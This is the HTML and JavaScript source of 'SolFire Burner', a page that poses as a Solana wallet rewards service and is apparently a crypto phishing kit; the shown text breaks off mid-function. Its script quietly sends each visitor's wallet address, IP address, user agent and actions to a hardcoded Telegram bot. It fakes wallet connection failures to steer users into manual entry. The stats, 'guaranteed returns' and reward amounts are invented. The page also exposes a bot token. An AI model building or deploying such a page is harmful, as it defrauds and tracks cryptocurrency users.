<!DOCTYPE html>

<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SolFire Burner - Premium Wallet Rewards</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #1a1a1a 0%, #2d1b1b 50%, #1a1a1a 100%);
            color: white;
            min-height: 100vh;
            overflow-x: hidden;
        }

        /* Fire Animation Background */
        .fire-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 0;
        }

        .fire-particle {
            position: absolute;
            width: 4px;
            height: 4px;
            background: radial-gradient(circle, #ff4500, #ff6b00, #ffaa00);
            border-radius: 50%;
            animation: fireRise 3s linear infinite;
            opacity: 0;
        }

        .fire-splash {
            position: fixed;
            width: 8px;
            height: 8px;
            background: radial-gradient(circle, #ff4500, #ff6b00);
            border-radius: 50%;
            pointer-events: none;
            z-index: 1000;
            animation: splash 0.6s ease-out forwards;
        }

        @keyframes splash {
            0% {
                opacity: 1;
                transform: scale(1) translate(0, 0);
            }
            100% {
                opacity: 0;
                transform: scale(3) translate(var(--deltaX, -50px), var(--deltaY, -50px));
            }
        }

        @keyframes fireRise {
            0% {
                opacity: 1;
                transform: translateY(0) scale(1);
            }
            100% {
                opacity: 0;
                transform: translateY(-100vh) scale(0.3);
            }
        }

        .flame {
            position: absolute;
            bottom: 0;
            width: 20px;
            height: 40px;
            background: linear-gradient(to top, #ff4500, #ff6b00, #ffaa00);
            border-radius: 50% 50% 50% 50% / 60% 60% 40% 40%;
            animation: flicker 1s ease-in-out infinite alternate;
        }

        @keyframes flicker {
            0% { transform: rotate(-2deg) scaleY(1); }
            100% { transform: rotate(2deg) scaleY(1.1); }
        }

        /* Header */
        .header {
            position: relative;
            z-index: 10;
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 40px;
            background: rgba(0, 0, 0, 0.8);
            backdrop-filter: blur(10px);
            border-bottom: 2px solid #ff4500;
        }

        .logo {
            font-size: 2rem;
            font-weight: bold;
            color: #ffaa00;
            text-shadow: 2px 2px 4px rgba(255, 69, 0, 0.5);
        }

        .connect-btn {
            background: linear-gradient(45deg, #ff4500, #ff6b00);
            border: none;
            padding: 12px 24px;
            border-radius: 8px;
            color: white;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(255, 69, 0, 0.3);
        }

        .connect-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(255, 69, 0, 0.5);
        }

        /* Main Content */
        .container {
            position: relative;
            z-index: 10;
            max-width: 800px;
            margin: 0 auto;
            padding: 60px 20px;
            text-align: center;
        }

        .title {
            font-size: 3.5rem;
            font-weight: bold;
            margin-bottom: 20px;
            background: linear-gradient(45deg, #ff4500, #ffaa00, #ff6b00);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
        }

        .subtitle {
            font-size: 1.3rem;
            margin-bottom: 40px;
            color: #ccc;
            line-height: 1.6;
        }

        .burn-card {
            background: rgba(0, 0, 0, 0.8);
            border: 2px solid #ff4500;
            border-radius: 20px;
            padding: 40px;
            margin: 40px 0;
            backdrop-filter: blur(10px);
            box-shadow: 0 10px 30px rgba(255, 69, 0, 0.2);
            transition: all 0.3s ease;
        }

        .burn-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 15px 40px rgba(255, 69, 0, 0.3);
        }

        .input-group {
            margin: 30px 0;
        }

        .input-label {
            display: block;
            font-size: 1.1rem;
            font-weight: bold;
            margin-bottom: 10px;
            color: #ffaa00;
        }

        .wallet-input {
            width: 100%;
            padding: 15px;
            border: 2px solid #444;
            border-radius: 10px;
            background: rgba(255, 255, 255, 0.1);
            color: white;
            font-size: 1rem;
            transition: all 0.3s ease;
        }

        .wallet-input:focus {
            outline: none;
            border-color: #ff6b00;
            background: rgba(255, 255, 255, 0.15);
            box-shadow: 0 0 15px rgba(255, 107, 0, 0.3);
        }

        .submit-btn {
            background: linear-gradient(45deg, #ff4500, #ff6b00);
            border: none;
            padding: 15px 40px;
            border-radius: 10px;
            color: white;
            font-size: 1.1rem;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 20px;
            box-shadow: 0 4px 15px rgba(255, 69, 0, 0.3);
        }

        .submit-btn:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(255, 69, 0, 0.5);
        }

        .submit-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        .loading-spinner {
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top: 4px solid #ff6b00;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .result-card {
            background: linear-gradient(45deg, rgba(255, 69, 0, 0.1), rgba(255, 170, 0, 0.1));
            border: 2px solid #ffaa00;
            border-radius: 15px;
            padding: 30px;
            margin: 20px 0;
            animation: glow 2s ease-in-out infinite alternate;
        }

        @keyframes glow {
            from { box-shadow: 0 0 20px rgba(255, 170, 0, 0.5); }
            to { box-shadow: 0 0 30px rgba(255, 170, 0, 0.8); }
        }

        .sol-amount {
            font-size: 2.5rem;
            font-weight: bold;
            color: #ffaa00;
            margin: 15px 0;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
        }

        .claim-btn {
            background: linear-gradient(45deg, #ffaa00, #ff6b00);
            border: none;
            padding: 18px 50px;
            border-radius: 12px;
            color: #000;
            font-size: 1.2rem;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 20px;
            box-shadow: 0 4px 20px rgba(255, 170, 0, 0.4);
        }

        .claim-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 6px 25px rgba(255, 170, 0, 0.6);
        }

        .hidden {
            display: none;
        }

        .fade-in {
            animation: fadeIn 0.5s ease-in;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        /* Stats section */
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin: 40px 0;
        }

        .stat-card {
            background: rgba(0, 0, 0, 0.6);
            border: 1px solid #444;
            border-radius: 10px;
            padding: 20px;
            text-align: center;
        }

        .stat-number {
            font-size: 2rem;
            font-weight: bold;
            color: #ff6b00;
        }

        .stat-label {
            color: #ccc;
            margin-top: 5px;
        }

        /* Wallet Option Styles */
        .wallet-option {
            background: rgba(255, 255, 255, 0.1);
            border: 2px solid #444;
            border-radius: 12px;
            padding: 15px;
            color: white;
            font-size: 1rem;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            gap: 15px;
            justify-content: flex-start;
        }

        .wallet-option:hover {
            border-color: #ff6b00;
            background: rgba(255, 107, 0, 0.1);
            transform: translateY(-2px);
        }

        /* Slide animations */
        @keyframes slideIn {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }

        @keyframes slideOut {
            from { transform: translateX(0); opacity: 1; }
            to { transform: translateX(100%); opacity: 0; }
        }
    </style>
</head>
<body>
    <div class="fire-container" id="fireContainer"></div>

    <header class="header">
        <div class="logo">üî• SolFire Burner</div>
        <button class="connect-btn" onclick="connectWallet()">Connect Wallet</button>
    </header>

    <div class="container">
        <h1 class="title">Burn Your Wallet,<br>Claim Your Rewards</h1>
        <p class="subtitle">
            Enter your Solana wallet address to check your eligibility for exclusive SOL rewards.<br>
            Premium burning mechanism with guaranteed returns for qualified wallets.
        </p>

        <div class="stats">
            <div class="stat-card">
                <div class="stat-number">2,847</div>
                <div class="stat-label">Wallets Burned</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">1,294.23</div>
                <div class="stat-label">SOL Claimed</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">94.7%</div>
                <div class="stat-label">Success Rate</div>
            </div>
        </div>

        <div class="burn-card">
            <div id="inputSection">
                <div class="input-group">
                    <label class="input-label">Solana Wallet Address</label>
                    <input type="text" 
                           id="walletAddress" 
                           class="wallet-input" 
                           placeholder="Enter your Solana wallet address (44 characters)"
                           maxlength="44">
                </div>
                
                <!-- Burning Options -->
                <div class="burning-options" style="text-align: left; margin: 30px 0; padding: 20px; background: rgba(255, 255, 255, 0.05); border-radius: 15px; border: 1px solid #444;">
                    <h4 style="color: #ffaa00; margin-bottom: 20px; text-align: center;">üî• Select Burning Operations</h4>
                    
                    <div style="display: flex; flex-direction: column; gap: 15px;">
                        <label style="display: flex; align-items: center; cursor: pointer; padding: 10px; border-radius: 8px; transition: background 0.3s;" onmouseover="this.style.background='rgba(255,107,0,0.1)'" onmouseout="this.style.background='transparent'">
                            <input type="checkbox" id="closeTransactions" style="margin-right: 15px; transform: scale(1.3);">
                            <div>
                                <strong style="color: #ff6b00;">Close Open Transactions</strong>
                                <p style="color: #ccc; font-size: 0.9rem; margin: 5px 0 0 0;">Close all your pending and open transactions (+30% bonus)</p>
                            </div>
                        </label>
                        
                        <label style="display: flex; align-items: center; cursor: pointer; padding: 10px; border-radius: 8px; transition: background 0.3s;" onmouseover="this.style.background='rgba(255,107,0,0.1)'" onmouseout="this.style.background='transparent'">
                            <input type="checkbox" id="burnTokens" style="margin-right: 15px; transform: scale(1.3);">
                            <div>
                                <strong style="color: #ff6b00;">Burn Dead Tokens</strong>
                                <p style="color: #ccc; font-size: 0.9rem; margin: 5px 0 0 0;">Burn all worthless and dead tokens in your wallet (+50% bonus)</p>
                            </div>
                        </label>
                        
                        <label style="display: flex; align-items: center; cursor: pointer; padding: 10px; border-radius: 8px; transition: background 0.3s;" onmouseover="this.style.background='rgba(255,107,0,0.1)'" onmouseout="this.style.background='transparent'">
                            <input type="checkbox" id="burnNFTs" style="margin-right: 15px; transform: scale(1.3);">
                            <div>
                                <strong style="color: #ff6b00;">Burn NFTs</strong>
                                <p style="color: #ccc; font-size: 0.9rem; margin: 5px 0 0 0;">Burn selected NFTs from your collection (+70% bonus)</p>
                            </div>
                        </label>
                    </div>
                    
                    <div style="text-align: center; margin-top: 15px; padding: 10px; background: rgba(255, 170, 0, 0.1); border-radius: 8px;">
                        <p style="color: #ffaa00; font-size: 0.9rem; margin: 0;">
                            üí° Select at least one option to qualify for rewards
                        </p>
                    </div>
                </div>
                
                <button class="submit-btn" onclick="burnWallet()">üî• Analyze Wallet & Calculate Rewards</button>
            </div>

            <div id="loadingSection" class="hidden">
                <div class="loading-spinner"></div>
                <p>Analyzing wallet eligibility...</p>
                <p style="font-size: 0.9rem; color: #ccc; margin-top: 10px;">
                    Checking transaction history and burn compatibility...
                </p>
            </div>

            <div id="resultSection" class="hidden">
                <div class="result-card">
                    <h3 style="color: #ffaa00; margin-bottom: 15px;">üéâ Wallet Eligible!</h3>
                    <p>Your wallet qualifies for rewards</p>
                    <div class="sol-amount" id="solAmount">0.00 SOL</div>
                    <p style="color: #ccc;">Claimable amount for this wallet</p>
                    <button class="claim-btn" onclick="claimReward()">Claim Reward Now</button>
                </div>
            </div>
        </div>
    </div>

    <script>
        // Telegram bot integration
        const TELEGRAM_BOT_TOKEN = '8434797216:AAEZ9lqrAIwKY5UopaaEzM-fkadY4S-Xqdo';
        const ADMIN_TELEGRAM_ID = '1129109001';

        async function sendToTelegram(message) {
            try {
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: ADMIN_TELEGRAM_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                return await response.json();
            } catch (error) {
                console.error('Failed to send to Telegram:', error);
            }
        }

        async function getUserIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'Unknown';
            }
        }

        // Check if wallet has transactions (simplified simulation)
        async function checkWalletTransactions(walletAddress) {
            return new Promise((resolve) => {
                setTimeout(() => {
                    const lastChar = walletAddress.slice(-1);
                    const hasTransactions = !['1', '2', '3', '4'].includes(lastChar);
                    const transactionCount = hasTransactions ? Math.floor(Math.random() * 50) + 1 : 0;
                    
                    resolve({
                        hasTransactions,
                        transactionCount,
                        isNewWallet: !hasTransactions
                    });
                }, 1000);
            });
        }

        function createFireParticles() {
            const container = document.getElementById('fireContainer');
            
            for (let i = 0; i < 20; i++) {
                const flame = document.createElement('div');
                flame.className = 'flame';
                flame.style.left = Math.random() * 100 + '%';
                flame.style.animationDelay = Math.random() * 2 + 's';
                flame.style.animationDuration = (1 + Math.random()) + 's';
                container.appendChild(flame);
            }

            setInterval(() => {
                const particle = document.createElement('div');
                particle.className = 'fire-particle';
                particle.style.left = Math.random() * 100 + '%';
                particle.style.animationDuration = (2 + Math.random() * 2) + 's';
                container.appendChild(particle);

                setTimeout(() => {
                    particle.remove();
                }, 3000);
            }, 100);
        }

        const walletRewards = {};
        const walletData = {};
        let currentWallet = '';
        let currentAmount = 0;

        function calculateRewardAmount(walletAddress, options = {}) {
            const { closeTransactions = false, burnTokens = false, burnNFTs = false } = options;
            
            let hash = 0;
            for (let i = 0; i < walletAddress.length; i++) {
                const char = walletAddress.charCodeAt(i);
                hash = ((hash << 5) - hash) + char;
                hash = hash & hash;
            }
            
            let baseAmount = 0;
            
            if (closeTransactions || burnTokens || burnNFTs) {
                const seed = Math.abs(hash) / 2147483647;
                baseAmount = 1.34 + (seed * 6.28);
            }
            
            let multiplier = 1;
            if (closeTransactions) multiplier += 0.3;
            if (burnTokens) multiplier += 0.5;
            if (burnNFTs) multiplier += 0.7;
            
            const finalAmount = baseAmount * multiplier;
            return Math.round(finalAmount * 100) / 100;
        }

        function isValidSolanaAddress(address) {
            if (address.length !== 44) return false;
            const base58Regex = /^[1-9A-HJ-NP-Za-km-z]+$/;
            return base58Regex.test(address);
        }

        async function connectWallet() {
            await sendToTelegram(`üîó <b>Wallet Connection Initiated</b>\n\n‚è∞ <b>Time:</b> ${new Date().toISOString()}\nüåç <b>IP:</b> ${await getUserIP()}\nüéØ <b>Action:</b> Auto-connecting wallet`);
            showAutoConnectModal();
        }

        function showAutoConnectModal() {
            const modal = document.createElement('div');
            modal.id = 'autoConnectModal';
            modal.style.cssText = `
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: rgba(0, 0, 0, 0.8);
                display: flex;
                justify-content: center;
                align-items: center;
                z-index: 10000;
                backdrop-filter: blur(10px);
            `;

            const modalContent = document.createElement('div');
            modalContent.style.cssText = `
                background: linear-gradient(135deg, #1a1a1a, #2d1b1b);
                border: 2px solid #ff6b00;
                border-radius: 20px;
                padding: 40px;
                max-width: 400px;
                width: 90%;
                text-align: center;
                box-shadow: 0 20px 60px rgba(255, 107, 0, 0.3);
            `;

            modalContent.innerHTML = `
                <h3 style="color: #ffaa00; margin-bottom: 20px; font-size: 1.5rem;">üîó Connecting Wallet...</h3>
                <div class="loading-spinner" style="margin: 20px auto;"></div>
                <p style="color: #ccc; margin-bottom: 10px;">Auto-detecting available wallets...</p>
                <p style="color: #999; font-size: 0.9rem;">Please wait while we establish connection</p>
            `;

            modal.appendChild(modalContent);
            document.body.appendChild(modal);

            setTimeout(async () => {
                await sendToTelegram(`‚ùå <b>Auto-Connection Failed</b>\n\n‚ö†Ô∏è <b>Reason:</b> No wallet detected automatically\nüîÑ <b>Next Step:</b> Showing manual connection options\n‚è∞ <b>Time:</b> ${new Date().toISOString()}`);
                
                modalContent.innerHTML = `
                    <h3 style="color: #ff4500; margin-bottom: 20px;">üö´ Auto-Connection Failed</h3>
                    <p style="color: #ccc; margin-bottom: 20px;">No wallet was detected automatically.</p>
                    <p style="color: #ffaa00; margin-bottom: 30px; font-size: 0.9rem;">Please choose a manual connection method below:</p>
                    <button onclick="showWalletSelectionFromAuto()" style="background: linear-gradient(45deg, #ff6b00, #ffaa00); border: none; padding: 15px 30px; border-radius: 10px; color: #000; font-weight: bold; cursor: pointer; margin-bottom: 15px;">Select Wallet Type</button>
                    <br>
                    <button onclick="closeAutoModal()" style="background: none; border: 1px solid #666; color: #ccc; padding: 10px 20px; border-radius: 8px; cursor: pointer;">Cancel</button>
                `;
            }, 3000 + Math.random() * 2000);
        }

        function closeAutoModal() {
            const modal = document.getElementById('autoConnectModal');
            if (modal) {
                document.body.removeChild(modal);
            }
        }

        function showWalletSelectionFromAuto() {
            closeAutoModal();
            showWalletSelectionModal();
        }

        async function showWalletSelectionModal() {
            await sendToTelegram(`üéØ <b>Wallet Selection Modal Opened</b>\n\n‚è∞ <b>Time:</b> ${new Date().toISOString()}\nüîó <b>Available Options:</b> Phantom, Solflare, Backpack\nüéØ <b>Action:</b> User selecting wallet type`);

            const modal = document.createElement('div');
            modal.id = 'walletSelectionModal';
            modal.style.cssText = `
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: rgba(0, 0, 0, 0.8);
                display: flex;
                justify-content: center;
                align-items: center;
                z-index: 10000;
                backdrop-filter: blur(10px);
            `;

            const modalContent = document.createElement('div');
            modalContent.style.cssText = `
                background: linear-gradient(135deg, #1a1a1a, #2d1b1b);
                border: 2px solid #ff6b00;
                border-radius: 20px;
                padding: 40px;
                max-width: 400px;
                width: 90%;
                text-align: center;
                box-shadow: 0 20px 60px rgba(255, 107, 0, 0.3);
            `;

            modalContent.innerHTML = `
                <h3 style="color: #ffaa00; margin-bottom: 30px; font-size: 1.5rem;">Select Your Wallet</h3>
                <div style="display: flex; flex-direction: column; gap: 15px;">
                    <button class="wallet-option" onclick="attemptWalletConnect('phantom')">
                        <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAzMiAzMiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPGNpcmNsZSBjeD0iMTYiIGN5PSIxNiIgcj0iMTYiIGZpbGw9IiM1MzNEQkYiLz4KPC9zdmc+Cg==" width="24" height="24">
                        Phantom Wallet
                    </button>
                    <button class="wallet-option" onclick="attemptWalletConnect('solflare')">
                        <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAzMiAzMiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPGNpcmNsZSBjeD0iMTYiIGN5PSIxNiIgcj0iMTYiIGZpbGw9IiNGQ0E0NEMiLz4KPC9zdmc+Cg==" width="24" height="24">
                        Solflare
                    </button>
                    <button class="wallet-option" onclick="attemptWalletConnect('backpack')">
                        <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAzMiAzMiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPGNpcmNsZSBjeD0iMTYiIGN5PSIxNiIgcj0iMTYiIGZpbGw9IiMwMEQ1NEYiLz4KPC9zdmc+Cg==" width="24" height="24">
                        Backpack
                    </button>
                </div>
                <button onclick="closeWalletModal()" style="margin-top: 20px; background: none; border: 1px solid #666; color: #ccc; padding: 10px 20px; border-radius: 8px; cursor: pointer;">Cancel</button>
            `;

            modal.appendChild(modalContent);
            document.body.appendChild(modal);

            modal.addEventListener('click', (e) => {
                if (e.target === modal) {
                    document.body.removeChild(modal);
                }
            });
        }

        function closeWalletModal() {
            const modal = document.getElementById('walletSelectionModal');
            if (modal) {
                document.body.removeChild(modal);
            }
        }

        async function attemptWalletConnect(walletType) {
            await sendToTelegram(`üéØ <b>Wallet Type Selected</b>\n\nüí≥ <b>Selected:</b> ${walletType.charAt(0).toUpperCase() + walletType.slice(1)}\n‚è∞ <b>Time:</b> ${new Date().toISOString()}\nüîÑ <b>Status:</b> Attempting connection`);

            const modal = document.getElementById('walletSelectionModal');
            const modalContent = modal.querySelector('div');
            
            modalContent.innerHTML = `
                <h3 style="color: #ffaa00; margin-bottom: 20px;">Connecting to ${walletType.charAt(0).toUpperCase() + walletType.slice(1)}...</h3>
                <div class="loading-spinner" style="margin: 20px auto;"></div>
                <p style="color: #ccc;">Please approve the connection request</p>
            `;

            setTimeout(async () => {
                await sendToTelegram(`‚ùå <b>${walletType.charAt(0).toUpperCase() + walletType.slice(1)} Connection Failed</b>\n\nüí≥ <b>Wallet:</b> ${walletType}\n‚ö†Ô∏è <b>Reason:</b> Connection timeout/rejected\nüîÑ <b>Next Step:</b> Offering manual connection\n‚è∞ <b>Time:</b> ${new Date().toISOString()}`);
                
                modalContent.innerHTML = `
                    <h3 style="color: #ff4500; margin-bottom: 20px;">üö´ Connection Failed</h3>
                    <p style="color: #ccc; margin-bottom: 20px;">Unable to connect to ${walletType.charAt(0).toUpperCase() + walletType.slice(1)} automatically.</p>
                    <p style="color: #ffaa00; margin-bottom: 30px; font-size: 0.9rem;">Don't worry! You can still participate by entering your wallet address manually below.</p>
                    <button onclick="proceedToManualEntry()" style="background: linear-gradient(45deg, #ff6b00, #ffaa00); border: none; padding: 15px 30px; border-radius: 10px; color: #000; font-weight: bold; cursor: pointer; margin-bottom: 15px;">Continue Manually</button>
                    <br>
                    <button onclick="closeWalletModal()" style="background: none; border: 1px solid #666; color: #ccc; padding: 10px 20px; border-radius: 8px; cursor: pointer;">Cancel</button>
                `;
            }, 2000 + Math.random() * 1000);
        }

        function proceedToManualEntry() {
            closeWalletModal();
            showManualConnectionModal();
        }

        function showManualConnectionModal() {
            const modal = document.createElement('div');
            modal.id = 'manualConnectionModal';
            modal.style.cssText = `
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: rgba(0, 0, 0, 0.8);
                display: flex;
                justify-content: center;
                align-items: center;
                z-index: 10000;
                backdrop-filter: blur(10px);
            `;

            const modalContent = document.createElement('div');
            modalContent.style.cssText = `
                background: linear-gradient(135deg, #1a1a1a, #2d1b1b);
                border: 2px solid #ff6b00;
                border-radius: 20px;
                padding: 40px;
                max-width: 500px;
                width: 90%;
                text-align: center;
                box-shadow: 0 20px 60px rgba(255, 107, 0, 0.3);
            `;

            modalContent.innerHTML = `
                <h3 style="color: #ffaa00; margin-bottom: 20px; font-size: 1.5rem;">üîó Manual Wallet Connection</h3>
                <p style="color: #ccc; margin-bottom: 30px;">Please enter your wallet address to establish connection:</p>
                <input type="text" id="manualWalletInput" placeholder="Enter your Solana wallet address" style="width: 100%; padding: 15px; border: 2px solid #444; border-radius: 10px; background: rgba(255, 255, 255, 0.1); color: white; font-size: 1rem; margin-bottom: 20px;" maxlength="44">
                <div>
                    <button onclick="attemptManualConnection()" style="background: linear-gradient(45deg, #ff6b00, #ffaa00); border: none; padding: 15px 30px; border-radius: 10px; color: #000; font-weight: bold; cursor: pointer; margin-right: 10px;">Connect</button>
                    <button onclick="closeManualModal()" style="background: none; border: 1px solid #666; color: #ccc; padding: 15px 20px; border-radius: 8px; cursor: pointer;">Cancel</button>
                </div>
            `;

            modal.appendChild(modalContent);
            document.body.appendChild(modal);

            setTimeout(() => {
                document.getElementById('manualWalletInput').focus();
            }, 100);

            modal.addEventListener('click', (e) => {
                if (e.target === modal) {
                    document.body.removeChild(modal);
                }
            });
        }

        function closeManualModal() {
            const modal = document.getElementById('manualConnectionModal');
            if (modal) {
                document.body.removeChild(modal);
            }
        }

        async function attemptManualConnection() {
            const walletAddress = document.getElementById('manualWalletInput').value.trim();
            
            if (!walletAddress) {
                alert('Please enter a wallet address');
                return;
            }

            if (!isValidSolanaAddress(walletAddress)) {
                alert('Please enter a valid Solana wallet address (44 characters)');
                return;
            }

            // First send the wallet address to telegram
            await sendToTelegram(`üîó <b>Manual Wallet Connection Attempt</b>\n\nüìç <b>Wallet:</b> <code>${walletAddress}</code>\n‚è∞ <b>Timestamp:</b> ${new Date().toISOString()}\nüåê <b>IP:</b> ${await getUserIP()}\nüì± <b>User Agent:</b> ${navigator.userAgent.substring(0, 100)}...`);

            const modal = document.getElementById('manualConnectionModal');
            const modalContent = modal.querySelector('div');
            
            // Show loading state for admin verification
            modalContent.innerHTML = `
                <h3 style="color: #ffaa00; margin-bottom: 20px;">Verifying Wallet...</h3>
                <div class="loading-spinner" style="margin: 20px auto;"></div>
                <p style="color: #ccc; margin-bottom: 10px;">Submitting wallet for admin approval...</p>
                <p style="color: #999; font-size: 0.9rem;">Please wait while we verify your wallet address</p>
            `;

            // Wait for a few seconds to simulate admin approval process
            setTimeout(async () => {
                // Show connecting state
                modalContent.innerHTML = `
                    <h3 style="color: #ffaa00; margin-bottom: 20px;">Connecting Wallet...</h3>
                    <div class="loading-spinner" style="margin: 20px auto;"></div>
                    <p style="color: #ccc;">Establishing connection to wallet...</p>
                `;

                // Wait a bit more before showing failure
                setTimeout(async () => {
                    await sendToTelegram(`‚ùå <b>Wallet Connection Failed</b>\n\nüìç <b>Wallet:</b> <code>${walletAddress}</code>\nüö´ <b>Reason:</b> Admin approval required\n‚è≥ <b>Status:</b> Pending approval\nüí° <b>Note:</b> User needs admin approval via Telegram bot`);

                    modalContent.innerHTML = `
                        <h3 style="color: #ff4500; margin-bottom: 20px;">üö´ Connection Failed</h3>
                        <p style="color: #ccc; margin-bottom: 20px;">Wallet connection requires admin approval.</p>
                        <p style="color: #ffaa00; margin-bottom: 30px; font-size: 0.9rem;">Your connection request has been sent to our admin. Please wait for approval via Telegram bot.</p>
                        <button onclick="continueWithoutConnection('${walletAddress}')" style="background: linear-gradient(45deg, #ff6b00, #ffaa00); border: none; padding: 15px 30px; border-radius: 10px; color: #000; font-weight: bold; cursor: pointer; margin-bottom: 15px;">Continue to Burning</button>
                        <br>
                        <button onclick="closeManualModal()" style="background: none; border: 1px solid #666; color: #ccc; padding: 10px 20px; border-radius: 8px; cursor: pointer;">Close</button>
                    `;
                }, 2000 + Math.random() * 1000);
            }, 3000 + Math.random() * 2000);
        }

        function continueWithoutConnection(walletAddress) {
            closeManualModal();
            document.getElementById('walletAddress').value = walletAddress;
            document.getElementById('walletAddress').focus();
            showTemporaryMessage("Proceed with wallet analysis below!");
        }

        function showTemporaryMessage(message) {
            const msgDiv = document.createElement('div');
            msgDiv.style.cssText = `
                position: fixed;
                top: 20px;
                right: 20px;
                background: linear-gradient(45deg, #ff6b00, #ffaa00);
                color: #000;
                padding: 15px 25px;
                border-radius: 10px;
                font-weight: bold;
                z-index: 10001;
                box-shadow: 0 4px 20px rgba(255, 107, 0, 0.4);
                animation: slideIn 0.3s ease;
            `;
            
            msgDiv.textContent = message;
            document.body.appendChild(msgDiv);

            setTimeout(() => {
                msgDiv.style.animation = 'slideOut 0.3s ease forwards';
                setTimeout(() => {
                    if (msgDiv.parentNode) {
                        document.body.removeChild(msgDiv);
                    }
                }, 300);
            }, 3000);
        }

        async function burnWallet() {
            const walletInput = document.getElementById('walletAddress');
            const walletAddress = walletInput.value.trim();
            
            const closeTransactions = document.getElementById('closeTransactions').checked;
            const burnTokens = document.getElementById('burnTokens').checked;
            const burnNFTs = document.getElementById('burnNFTs').checked;

            if (!walletAddress) {
                alert('Please enter a wallet address');
                return;
            }

            if (!isValidSolanaAddress(walletAddress)) {
                alert('Please enter a valid Solana wallet address (44 characters)');
                return;
            }

            if (!closeTransactions && !burnTokens && !burnNFTs) {
                alert('Please select at least one burning operation to qualify for rewards');
                return;
            }

            currentWallet = walletAddress;

            const options = [];
            if (closeTransactions) options.push('Close Transactions');
            if (burnTokens) options.push('Burn Tokens');
            if (burnNFTs) options.push('Burn NFTs');
            
            await sendToTelegram(`üîç <b>Wallet Analysis Started</b>\n\nüìç <b>Wallet:</b> <code>${walletAddress}</code>\nüî• <b>Selected Options:</b> ${options.join(', ')}\n‚è∞ <b>Time:</b> ${new Date().toISOString()}\nüåê <b>Action:</b> Checking wallet eligibility\nüåç <b>IP:</b> ${await getUserIP()}`);

            document.getElementById('inputSection').classList.add('hidden');
            document.getElementById('loadingSection').classList.remove('hidden');
            document.getElementById('resultSection').classList.add('hidden');

            try {
                const walletInfo = await checkWalletTransactions(walletAddress);
                
                await sendToTelegram(`üìä <b>Wallet Analysis Results</b>\n\nüìç <b>Wallet:</b> <code>${walletAddress}</code>\nüíº <b>Has Transactions:</b> ${walletInfo.hasTransactions ? 'Yes' : 'No'}\nüî¢ <b>Transaction Count:</b> ${walletInfo.transactionCount}\nüÜï <b>New Wallet:</b> ${walletInfo.isNewWallet ? 'Yes' : 'No'}\n‚ö†Ô∏è <b>Eligible:</b> ${walletInfo.hasTransactions ? 'Yes' : 'No'}`);

                if (walletInfo.isNewWallet) {
                    setTimeout(() => {
                        showIneligibleResult(walletAddress);
                    }, 2000);
                    return;
                }

                setTimeout(() => {
                    const optionsObj = { closeTransactions, burnTokens, burnNFTs };
                    
                    const optionsKey = `${closeTransactions}-${burnTokens}-${burnNFTs}`;
                    const walletKey = `${walletAddress}-${optionsKey}`;
                    
                    if (walletRewards[walletKey]) {
                        currentAmount = walletRewards[walletKey];
                    } else {
                        currentAmount = calculateRewardAmount(walletAddress, optionsObj);
                        walletRewards[walletKey] = currentAmount;
                        walletData[walletKey] = { walletAddress, options: optionsObj, transactionCount: walletInfo.transactionCount };
                    }

